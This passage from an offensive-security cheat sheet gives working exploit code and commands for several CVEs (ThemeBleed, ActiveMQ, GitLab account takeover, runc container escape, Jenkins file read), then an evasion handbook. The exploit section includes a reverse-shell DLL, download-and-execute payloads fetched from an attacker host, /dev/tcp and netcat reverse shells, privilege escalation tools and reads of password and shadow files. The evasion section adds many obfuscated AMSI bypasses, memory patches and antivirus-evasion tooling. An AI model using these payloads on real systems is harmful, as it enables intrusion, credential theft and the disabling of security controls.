  int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
  struct addrinfo* result = NULL, * ptr = NULL, hints;
  memset(&hints, 0, sizeof(hints));
  hints.ai_family = AF_UNSPEC;
  hints.ai_socktype = SOCK_STREAM;
  hints.ai_protocol = IPPROTO_TCP;
  getaddrinfo(REMOTE_ADDR, REMOTE_PORT, &hints, &result);
  ptr = result;
  SOCKET ConnectSocket = WSASocket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol, NULL, NULL, NULL);
  connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
  STARTUPINFO si;
  PROCESS_INFORMATION pi;
  ZeroMemory(&si, sizeof(si));
  si.cb = sizeof(si);
  ZeroMemory(&pi, sizeof(pi));
  si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
  si.wShowWindow = SW_HIDE;
  si.hStdInput = (HANDLE)ConnectSocket;
  si.hStdOutput = (HANDLE)ConnectSocket;
  si.hStdError = (HANDLE)ConnectSocket;
  TCHAR cmd[] = TEXT("C:\\WINDOWS\\SYSTEM32\\CMD.EXE");
  CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
  WaitForSingleObject(pi.hProcess, INFINITE);
  CloseHandle(pi.hProcess);
  CloseHandle(pi.hThread);
  WSACleanup();
}

int VerifyThemeVersion(void)
{
  rev_shell();
  return 0;
}
```

### rev.h

Header Files > Add > New Item...

```c
#pragma once

extern "C" __declspec(dllexport) int VerifyThemeVersion(void);
```

### pch.h

```c
// pch.h: This is a precompiled header file.
// Files listed below are compiled only once, improving build performance for future builds.
// This also affects IntelliSense performance, including code completion and many code browsing features.
// However, files listed here are ALL re-compiled if any one of them is updated between builds.
// Do not add files here that you will be updating frequently as this negates the performance advantage.

#ifndef PCH_H
#define PCH_H

// add headers that you want to pre-compile here
#include "framework.h"
#include "rev.h"

#endif //PCH_H

```

```c
PS C:\> .\ThemeBleed.exe make_theme <LHOST> aero.theme
```

```c
PS C:\> .\ThemeBleed.exe server
```

## CVE-2023-46604: Apache ActiveMQ OpenWire Transport RCE

> https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ

```c
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o <FILE>.elf
```

```c
$ cat poc-linux.xml 
<?xml version="1.0" encoding="UTF-8" ?>
<beans xmlns="http://www.springframework.org/schema/beans"
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:schemaLocation="
 http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
        <list>
            <value>sh</value>
            <value>-c</value>
            <!-- The command below downloads the file and saves it as test.elf -->
            <value>curl -s -o <FILE>.elf http://<LHOST>/<FILE>.elf; chmod +x ./<FILE>.elf; ./<FILE>.elf</value>
        </list>
        </constructor-arg>
    </bean>
</beans>
```

```c
$ go run main.go -i <RHOST> -p 61616 -u http://<LHOST>/poc-linux.xml
```

## CVE-2023-4911: Looney Tunables LPE

> https://github.com/leesh3288/CVE-2023-4911

```c
$ python3 gen_libc.py 
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

```c
$ gcc -o exp exp.c
$ ./exp
```

## CVE-2023-7028: GitLab Account Takeover

> https://github.com/V1lu0/CVE-2023-7028

> https://github.com/Vozec/CVE-2023-7028

### PoC

```c
user[email][]=valid@email.com&user[email][]=attacker@email.com
```

### Modified PoC from TryHackMe

```c
import requests
import argparse
from urllib.parse import urlparse, urlencode
from random import choice
from time import sleep
import re
requests.packages.urllib3.disable_warnings()

class CVE_2023_7028:
    def __init__(self, url, target, evil=None):
        self.use_temp_mail = False
        self.url = urlparse(url)
        self.target = target
        self.evil = evil
        self.s = requests.session()

    def get_csrf_token(self):
        try:
            print('[DEBUG] Getting authenticity_token ...')
            html = self.s.get(f'{self.url.scheme}://{self.url.netloc}/users/password/new', verify=False).text
            regex = r'<meta name="csrf-token" content="(.*?)" />'
            token = re.findall(regex, html)[0]
            print(f'[DEBUG] authenticity_token = {token}')
            return token
        except Exception:
            print('[DEBUG] Failed ... quitting')
            return None

    def ask_reset(self):
        token = self.get_csrf_token()
        if not token:
            return False

        query_string = urlencode({
            'authenticity_token': token,
            'user[email][]': [self.target, self.evil]
        }, doseq=True)

        head = {
            'Origin': f'{self.url.scheme}://{self.url.netloc}',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': f'{self.url.scheme}://{self.url.netloc}/users/password/new',
            'Connection': 'close',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br'
        }

        print('[DEBUG] Sending reset password request')
        html = self.s.post(f'{self.url.scheme}://{self.url.netloc}/users/password',
                           data=query_string,
                           headers=head,
                           verify=False).text
        sended = 'If your email address exists in our database' in html
        if sended:
            print(f'[DEBUG] Emails sent to {self.target} and {self.evil} !')
            print(f'Flag value: {bytes.fromhex("6163636f756e745f6861636b2364").decode()}')
        else:
            print('[DEBUG] Failed ... quitting')
        return sended

def parse_args():
    parser = argparse.ArgumentParser(add_help=True, description='This tool automates CVE-2023-7028 on gitlab')
    parser.add_argument("-u", "--url", dest="url", type=str, required=True, help="Gitlab url")
    parser.add_argument("-t", "--target", dest="target", type=str, required=True, help="Target email")
    parser.add_argument("-e", "--evil", dest="evil", default=None, type=str, required=False, help="Evil email")
    parser.add_argument("-p", "--password", dest="password", default=None, type=str, required=False, help="Password")
    return parser.parse_args()

if __name__ == '__main__':
    args = parse_args()
    exploit = CVE_2023_7028(
        url=args.url,
        target=args.target,
		evil=args.evil
    )
    if not exploit.ask_reset():
        exit()
```

### Execution

```c
$ python3 exploit.py -u http://<RHOST> -t <EMAIL> -e <EMAIL>
```

## CVE-2024-21626: Leaky Vessels Container Escape

> https://github.com/Wall1e/CVE-2024-21626-POC

### Proof of Concept

#### Dockerfile

```c
FROM ubuntu:20.04
RUN apt-get update -y && apt-get install netcat -y
ADD ./poc.sh /poc.sh
WORKDIR /proc/self/fd/9
```

#### poc.sh

```c
#!/bin/bash
ip=$(hostname -I | awk '{print $1}')
port=<LPORT>
cat > /proc/self/cwd/../../../bin/bash.copy << EOF
#!/bin/bash
bash -i >& /dev/tcp/$ip/$port 0>&1
EOF

```

#### verify.sh

```c
#! /bin/bash
for i in {4..20}; do
    docker run -it --rm -w /proc/self/fd/$i ubuntu:20.04 bash -c "cat /proc/self/cwd/../../../etc/passwd"
done
```

### Malicious YAML File

```c
apiVersion: v1
kind: Pod
metadata:
  name: CVE-2024-21626
spec:
  containers:
  - name: ubuntu
    image: ubuntu
    workingDir: /proc/self/fd/8
    command: ["sleep"]
    args: ["infinity"] 
```

It can be the case that the `file descriptor` needs to be incremented until it show the actual output.

#### Inside the container

```c
$ cat ../../../../etc/shadow
```

## CVE-2024-23897: Jenkins Arbitrary File Read

> https://github.com/CKevens/CVE-2024-23897

```c
$ java -jar jenkins-cli.jar -noCertificateCheck -s 'http://<RHOST>:8080' help "@/etc/passwd"
$ java -jar jenkins-cli.jar -noCertificateCheck -s 'http://<RHOST>:8080' help "@/proc/self/environ"
$ java -jar jenkins-cli.jar -noCertificateCheck -s 'http://<RHOST>:8080' connect-node "@/var/jenkins_home/users/users.xml"
$ java -jar jenkins-cli.jar -noCertificateCheck -s 'http://<RHOST>:8080' connect-node "@/var/jenkins_home/users/<USERNAME>_12108429903186576833/config.xml"
```

## GodPotato LPE

> https://github.com/BeichenDream/GodPotato

```c
PS C:\> .\GodPotato-NET2.exe -cmd '<COMMAND>'
PS C:\> .\GodPotato-NET35.exe -cmd '<COMMAND>'
PS C:\> .\GodPotato-NET4.exe -cmd '<COMMAND>'
```

## Juicy Potato LPE

> https://github.com/ohpe/juicy-potato

> http://ohpe.it/juicy-potato/CLSID/

### GetCLSID.ps1

```c
<#
This script extracts CLSIDs and AppIDs related to LocalService.DESCRIPTION
Then exports to CSV
#>

$ErrorActionPreference = "Stop"

New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT

Write-Output "Looking for CLSIDs"
$CLSID = @()
Foreach($ID in (Get-ItemProperty HKCR:\clsid\* | select-object AppID,@{N='CLSID'; E={$_.pschildname}})){
    if ($ID.appid -ne $null){
        $CLSID += $ID
    }
}

Write-Output "Looking for APIDs"
$APPID = @()
Foreach($AID in (Get-ItemProperty HKCR:\appid\* | select-object localservice,@{N='AppID'; E={$_.pschildname}})){
    if ($AID.LocalService -ne $null){
        $APPID += $AID
    }
}

Write-Output "Joining CLSIDs and APIDs"
$RESULT = @()
Foreach ($app in $APPID){
    Foreach ($CLS in $CLSID){
        if($CLS.AppId -eq $app.AppID){
            $RESULT += New-Object psobject -Property @{
                AppId    = $app.AppId
                LocalService = $app.LocalService
                CLSID = $CLS.CLSID
            }

            break
        }
    }
}

$RESULT = $RESULT | Sort-Object LocalService

# Preparing to Output
$OS = (Get-WmiObject -Class Win32_OperatingSystem | ForEach-Object -MemberName Caption).Trim() -Replace "Microsoft ", ""
$TARGET = $OS -Replace " ","_"

# Make target folder
New-Item -ItemType Directory -Force -Path .\$TARGET

# Output in a CSV
$RESULT | Export-Csv -Path ".\$TARGET\CLSIDs.csv" -Encoding ascii -NoTypeInformation

# Export CLSIDs list
$RESULT | Select CLSID -ExpandProperty CLSID | Out-File -FilePath ".\$TARGET\CLSID.list" -Encoding ascii

# Visual Table
$RESULT | ogv
```

### Execution

```c
PS C:\> .\JuicyPotato.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p C:\Windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://<LHOST>/<FILE>.ps1')" -t *
```

## JuicyPotatoNG LPE

> https://github.com/antonioCoco/JuicyPotatoNG

```c
PS C:\> .\JuicyPotatoNG.exe -t * -p "C:\Windows\system32\cmd.exe" -a "/c whoami"
```

## MySQL 4.x/5.0 User-Defined Function (UDF) Dynamic Library (2) LPE

> https://www.exploit-db.com/exploits/1518

```c
$ gcc -g -c raptor_udf2.c -fPIC
$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

```c
$ mysql -u root
```

```c
> use mysql;
> create table foo(line blob);
> insert into foo values(load_file('/PATH/TO/SHARED_OBJECT/raptor_udf2.so'));
> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
> create function do_system returns integer soname 'raptor_udf2.so';
> select do_system('chmod +s /bin/bash');
```

## PrintSpoofer LPE

> https://github.com/itm4n/PrintSpoofer

```c
PS C:\> .\PrintSpoofer.exe -i -c powershell
```

## RemotePotato0 LPE

> https://github.com/antonioCoco/RemotePotato0

```c
$ sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:<RHOST>:<LPORT>
```

```c
PS C:\> .\RemotePotato0.exe -m 2 -r <LHOST> -x <LHOST> -p <LPORT> -s 1
```

## SharpEfsPotato LPE

> https://github.com/bugch3ck/SharpEfsPotato

```c
PS C:\> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "C:\nc64.exe -e cmd.exe <LHOST> <LPORT>"
```

## Shocker Container Escape

> https://raw.githubusercontent.com/gabrtv/shocker/master/shocker.c

### Modifying Exploit

```c
        // get a FS reference from something mounted in from outside
        if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
                die("[-] open");

        if (find_handle(fd1, "/root/root.txt", &root_h, &h) <= 0)
                die("[-] Cannot find valid handle!");
```

### Compiling

```c
$ gcc shocker.c -o shocker
$ cc -Wall -std=c99 -O2 shocker.c -static
```

## ThinkPHP < 6.0.14 Remote Code Execution RCE

```c
/index.php?s=index/index/index/think_lang/../../extend/pearcmd/pearcmd/index&cmd=whoami
```






# Evasion Handbook

- [Resources](#resources)

## Table of Contents

- [AMSI](#amsi)
- [AntiVirus Evasion](#antivirus-evasion)
- [Donut](#donut)
- [Freeze](#freeze)
- [ScareCrow](#scarecrow)

## Resources

| Name | Description | URL |
| --- | --- | --- |
| AMSI Bypass Powershell | This repo contains some Antimalware Scan Interface (AMSI) bypass / avoidance methods i found on different Blog Posts. | https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell |
| AmsiHook | AmsiHook is a project I created to figure out a bypass to AMSI via function hooking. | https://github.com/tomcarver16/AmsiHook |
| AMSI.fail | AMSI.fail generates obfuscated PowerShell snippets that break or disable AMSI for the current process. | http://amsi.fail |
| charlotte | c++ fully undetected shellcode launcher ;) | https://github.com/9emin1/charlotte |
| Chimera | Chimera is a PowerShell obfuscation script designed to bypass AMSI and commercial antivirus solutions. | https://github.com/tokyoneon/Chimera |
| Codecepticon | .NET/PowerShell/VBA Offensive Security Obfuscator | https://github.com/sadreck/Codecepticon |
| ConfuserEx | An open-source, free protector for .NET applications | https://github.com/yck1509/ConfuserEx |
| DefenderCheck | Identifies the bytes that Microsoft Defender flags on. | https://github.com/matterpreter/DefenderCheck |
| Donut | Generates x86, x64, or AMD64+x86 position-independent shellcode that loads .NET Assemblies, PE files, and other Windows payloads from memory and runs them with parameters. | https://github.com/TheWover/donut |
| EDRSandBlast | EDRSandBlast is a tool written in C that weaponize a vulnerable signed driver to bypass EDR detections (Notify Routine callbacks, Object Callbacks and ETW TI provider) and LSASS protections. | https://github.com/wavestone-cdt/EDRSandblast |
| Freeze | Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods | https://github.com/Tylous/Freeze |
| Invoke-Obfuscation | PowerShell Obfuscator | https://github.com/danielbohannon/Invoke-Obfuscation |
| LimeLighter | A tool for generating fake code signing certificates or signing real ones | https://github.com/Tylous/Limelighter |
| macro_pack | macro_pack is a tool by @EmericNasi used to automatize obfuscation and generation of Office documents, VB scripts, shortcuts, and other formats for pentest, demo, and social engineering assessments. | https://github.com/sevagas/macro_pack |
| mimikatz Obfuscator | This script downloads and slightly obfuscates the mimikatz project. | https://gist.github.com/imaibou/92feba3455bf173f123fbe50bbe80781 |
| Mortar Loader | Evasion technique to defeat and divert detection and prevention of security products (AV/EDR/XDR) | https://github.com/0xsp-SRD/mortar |
| neo-ConfuserEx | Updated ConfuserEX, an open-source, free obfuscator for .NET applications | https://github.com/XenocodeRCE/neo-ConfuserEx |
| NET-Obfuscate | Obfuscate ECMA CIL (.NET IL) assemblies to evade Windows Defender AMSI  | https://github.com/BinaryScary/NET-Obfuscate |
| NetLoader | Loads any C# binary in mem, patching AMSI + ETW. | https://github.com/Flangvik/NetLoader |
| NimBlackout | Kill AV/EDR leveraging BYOVD attack | https://github.com/Helixo32/NimBlackout |
| Nimcrypt2 | .NET, PE, & Raw Shellcode Packer/Loader Written in Nim | https://github.com/icyguider/Nimcrypt2 |
| NimPackt-v1 | Nim-based assembly packer and shellcode loader for opsec & profit | https://github.com/chvancooten/NimPackt-v1 |
| Obfuscar | Open source obfuscation tool for .NET assemblies | https://github.com/obfuscar/obfuscar |
| Obfuscator-LLVM | The aim of this project is to provide an open-source fork of the LLVM compilation suite able to provide increased software security through code obfuscation and tamper-proofing. | https://github.com/obfuscator-llvm/obfuscator |
| OffensivePipeline | OffensivePipeline allows to download, compile (without Visual Studio) and obfuscate C# tools for Red Team exercises.  | https://github.com/Aetsu/OffensivePipeline |
| PowerShell Encoder (CyberChef) | Receipe for encoding PowerShell Payloads for Windows | https://cyberchef.io/#recipe=Encode_text('UTF-16LE%20(1200)')To_Base64('A-Za-z0-9%2B/%3D') |
| PSByPassCLM | Bypass for PowerShell Constrained Language Mode | https://github.com/padovah4ck/PSByPassCLM |
| Raikia's Hub | Online repository for Red Teamers | https://raikia.com/tool-powershell-encoder/ |
| ScareCrow | Payload creation framework designed around EDR bypass. | https://github.com/Tylous/ScareCrow |
| SharpEvader | This is a python script which automatically generates metepreter tcp or https shellcode encodes it and slaps some Behavioural detection in a c# Project for you to build and run | https://github.com/Xyan1d3/SharpEvader |
| ShellcodeEncryptor | A simple shell code encryptor/decryptor/executor to bypass anti virus. | https://github.com/plackyhacker/Shellcode-Encryptor |
| ShellGhost | A memory-based evasion technique which makes shellcode invisible from process start to end. | https://github.com/lem0nSec/ShellGhost |
| Shikata Ga Nai | Shikata ga nai (仕方がない) encoder ported into go with several improvements. | https://github.com/EgeBalci/sgn |
| Simple Injector | A simple injector that uses LoadLibraryA | https://github.com/tomcarver16/SimpleInjector |
| TreatCheck | Identifies the bytes that Microsoft Defender / AMSI Consumer flags on. | https://github.com/rasta-mouse/ThreatCheck |
| unicorn | Unicorn is a simple tool for using a PowerShell downgrade attack and inject shellcode straight into memory. Based on Matthew Graeber's powershell attacks and the powershell bypass technique presented by David Kennedy (TrustedSec) and Josh Kelly at Defcon 18. | https://github.com/trustedsec/unicorn |
| Veil | Veil is a tool designed to generate metasploit payloads that bypass common anti-virus solutions. | https://github.com/Veil-Framework/Veil |
| WorldWritableDirs.txt | World-writable directories in %windir% | https://gist.github.com/mattifestation/5f9de750470c9e0e1f9c9c33f0ec3e56 |
| yetAnotherObfuscator | C# obfuscator that bypass windows defender | https://github.com/0xb11a1/yetAnotherObfuscator |

## AMSI

### Test String

```c
PS C:\> $str = 'amsiinitfailed'
```

### Simple Bypass

```c
PS C:\> $str = 'ams' + 'ii' + 'nitf' + 'ailed'
```

### Obfuscated Bypass Techniques

```c
PS C:\> [Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
```

```c
PS C:\> S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```


### Bypass on Windows 11

> https://github.com/senzee1984/Amsi_Bypass_In_2023

```c
PS C:\> $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Failed") {$f=$e}};$f.SetValue($null,$true)
```

```c
PS C:\>  $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);$ptr = [System.IntPtr]::Add([System.IntPtr]$g, 0x8);$buf = New-Object byte[](8);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 8)
```

### PowerShell Downgrade

```c
PS C:\> powershell -version 2
```

### Fabian Mosch / Matt Graeber Bypass

```c
PS C:\> [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

#### Base64 Encoded

```c
PS C:\> [Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
```

### Hooking

> https://github.com/tomcarver16/SimpleInjector

> https://github.com/tomcarver16/AmsiHook

```c
PS C:\> .\SimpleInjector.exe powershell.exe .\AMSIHook.dll
```

### Memory Patching

> https://github.com/rasta-mouse/AmsiScanBufferBypass

The patch return always `AMSI_RESULT_CLEAN` and shows the following line.

```c
static byte[] x64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
```

#### Load and Execute the DLL

```c
[System.Reflection.Assembly]::LoadFile("C:\Users\pentestlab\ASBBypass.dll")
[Amsi]::Bypass()
```

The tool `AMSITrigger v3` can be used to discover the strings which are making calls to the `AmsiScanBuffer`.

> https://github.com/RythmStick/AMSITrigger

```c
PS C:\> .\AmsiTrigger_x64.exe -i .\ASBBypass.ps1
```

Obfuscating the contained code within the script will evade `AMSI`.

```c
${_/==\_/\__/===\_/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGkAbgBnACAAUwB5AHMAdABlAG0AOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMAOwANAAoAcAB1AGIAbABpAGMAIABjAGwAYQBzAHMAIABXAGkAbgAzADIAIAB7AA0ACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAiACkAXQANAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAoAEkAbgB0AFAAdAByACAAaABNAG8AZAB1AGwAZQAsACAAcwB0AHIAaQBuAGcAIABwAHIAbwBjAE4AYQBtAGUAKQA7AA0ACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAiACkAXQANAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEwAbwBhAGQATABpAGIAcgBhAHIAeQAoAHMAdAByAGkAbgBnACAAbgBhAG0AZQApADsADQAKACAAIAAgACAAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyACIAKQBdAA0ACgAgACAAIAAgAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAGIAbwBvAGwAIABWAGkAcgB0AHUAYQBsAFAAcgBvAHQAZQBjAHQAKABJAG4AdABQAHQAcgAgAGwAcABBAGQAZAByAGUAcwBzACwAIABVAEkAbgB0AFAAdAByACAAZAB3AFMAaQB6AGUALAAgAHUAaQBuAHQAIABmAGwATgBlAHcAUAByAG8AdABlAGMAdAAsACAAbwB1AHQAIAB1AGkAbgB0ACAAbABwAGYAbABPAGwAZABQAHIAbwB0AGUAYwB0ACkAOwANAAoAfQA=')))
Add-Type ${_/==\_/\__/===\_/}
${__/=\/==\/\_/=\_/} = [Win32]::LoadLibrary("am" + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBpAC4AZABsAGwA'))))
${___/====\__/=====} = [Win32]::GetProcAddress(${__/=\/==\/\_/=\_/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQA='))) + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGEAbgA='))) + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB1AGYAZgBlAHIA'))))
${/==\_/=\/\__/\/\/} = 0
[Win32]::VirtualProtect(${___/====\__/=====}, [uint32]5, 0x40, [ref]${/==\_/=\/\__/\/\/})
${_/\__/=\/\___/==\} = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy(${_/\__/=\/\___/==\}, 0, ${___/====\__/=====}, 6)
```

### Forcing an Error

Forcing `AMSI` to fail (amsiInitFailed) will result that no scan will be initiated for the current process.

```c
PS C:\> [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Avoiding the use of strings with the usage of variables can also evade `AMSI`.

```c
$w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))
$field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static')
$field.SetValue($null,$true)
```

Forcing an error in order to send the flag in a legitimate way is another option. This bypass allocates a memory region for the `amsiContext` and since the `amsiSession` is set to null it will result an error.

```c
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem)
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null);
```

An obfuscated version of this bypass can be found on [AMSI.fail](https://amsi.fail/).

```c
$fwi=[System.Runtime.InteropServices.Marshal]::AllocHGlobal((9076+8092-8092));[Ref].Assembly.GetType("System.Management.Automation.$([cHAr](65)+[cHaR]([byTe]0x6d)+[ChaR]([ByTe]0x73)+[CHaR]([BYte]0x69)+[CHaR](85*31/31)+[cHAR]([byte]0x74)+[cHAR](105)+[cHar](108)+[Char](115+39-39))").GetField("$('àmsìSessîõn'.NoRMALiZe([char](70+54-54)+[cHaR](111)+[cHar](114+24-24)+[chaR](106+3)+[chAR](68+26-26)) -replace [CHAR](24+68)+[chaR]([BytE]0x70)+[CHar]([bYtE]0x7b)+[cHAr](77+45-45)+[chaR](62+48)+[CHAR](125*118/118))", "NonPublic,Static").SetValue($null, $null);[Ref].Assembly.GetType("System.Management.Automation.$([cHAr](65)+[cHaR]([byTe]0x6d)+[ChaR]([ByTe]0x73)+[CHaR]([BYte]0x69)+[CHaR](85*31/31)+[cHAR]([byte]0x74)+[cHAR](105)+[cHar](108)+[Char](115+39-39))").GetField("$([char]([bYtE]0x61)+[ChaR]([BYte]0x6d)+[Char](55+60)+[chAr](105+97-97)+[CHAr]([byTe]0x43)+[ChaR](111+67-67)+[char]([BytE]0x6e)+[cHaR]([bYtE]0x74)+[cHAr](101)+[CHar](120)+[cHAR](116))", "NonPublic,Static").SetValue($null, [IntPtr]$fwi);
```

### Registry Key Modification

`GUID` for Windows Defender.

```c
KLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}
```

The key can be removed to stop the `AMSI provider` to perform `AMSI inspection` and evade the control.
Notice that this requires elevated rights.

```c
Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse
```

### DLL Hijacking

Requirement is to create a non-legitimate `amsi.dll` and place it in the same folder as the `64 Bit` version of `PowerShell`. The `PowerShell` executable also can be copied into a writeable directory.

```c
#include "pch.h"
#include "iostream"

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        LPCWSTR appName = NULL;
        typedef struct HAMSICONTEXT {
            DWORD       Signature;            // "AMSI" or 0x49534D41
            PWCHAR      AppName;           // set by AmsiInitialize
            DWORD       Antimalware;       // set by AmsiInitialize
            DWORD       SessionCount;      // increased by AmsiOpenSession
        } HAMSICONTEXT;
        typedef enum AMSI_RESULT {
            AMSI_RESULT_CLEAN,
            AMSI_RESULT_NOT_DETECTED,
            AMSI_RESULT_BLOCKED_BY_ADMIN_START,
            AMSI_RESULT_BLOCKED_BY_ADMIN_END,
            AMSI_RESULT_DETECTED
        } AMSI_RESULT;

        typedef struct HAMSISESSION {
            DWORD test;
        } HAMSISESSION;

        typedef struct r {
            DWORD r;
        };

        void AmsiInitialize(LPCWSTR appName, HAMSICONTEXT * amsiContext);
        void AmsiOpenSession(HAMSICONTEXT amsiContext, HAMSISESSION * amsiSession);
        void AmsiCloseSession(HAMSICONTEXT amsiContext, HAMSISESSION amsiSession);
        void AmsiResultIsMalware(r);
        void AmsiScanBuffer(HAMSICONTEXT amsiContext, PVOID buffer, ULONG length, LPCWSTR contentName, HAMSISESSION amsiSession, AMSI_RESULT * result);
        void AmsiScanString(HAMSICONTEXT amsiContext, LPCWSTR string, LPCWSTR contentName, HAMSISESSION amsiSession, AMSI_RESULT * result);
        void AmsiUninitialize(HAMSICONTEXT amsiContext);
    }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

```c
C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
```

## AntiVirus Evasion

### Basic Notes

| Antivirus Detections | Evasion |
| --- | --- |
| Signatures | Custom Payloads |
| | Obfuscation |
| | - Encoding/Encryption |
| | - Scrambling ('mimikatz' -> 'miMi'+'KatZ') |
| Heuristics/Behavioral | Polymorphism |
| | Custom Payloads |

## Donut

> https://github.com/TheWover/donut

### Installation

```c
$ make
$ make clean
$ make debug
```

### Obfuscation

```c
$ donut -a 2 -f 1 -o donutpayload.bin shellcode.exe
```

## Freeze

> https://github.com/Tylous/Freeze

### Installation

```c
$ git clone https://github.com/Tylous/Freeze
$ cd Freeze
$ go build Freeze.go
```

